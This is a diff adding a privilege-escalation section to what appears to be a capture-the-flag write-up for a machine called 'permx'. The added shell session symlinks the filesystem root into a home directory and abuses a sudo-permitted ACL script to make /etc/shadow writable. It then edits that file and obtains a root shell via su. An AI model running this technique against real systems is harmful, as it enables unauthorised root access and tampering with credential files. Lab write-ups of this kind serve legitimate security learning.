@@ -286,3 +286,16 @@ fi
 /usr/bin/sudo /usr/bin/setfacl -m u:"$user":"$perm" "$target"
 ```
 
+Privilege escalation (do it very fast or ACL get reset):
+```bash
+mtz@permx:~$ ln -s / /home/mtz/root_link
+mtz@permx:~$ sudo /opt/acl.sh mtz rwx /home/mtz/root_link/etc/shadow
+mtz@permx:~$ nano /etc/shadow
+mtz@permx:~$ sudo su
+[sudo] password for mtz: 
+sudo: a password is required
+mtz@permx:~$ su
+Password: 
+root@permx:/home/mtz# 
+```
+
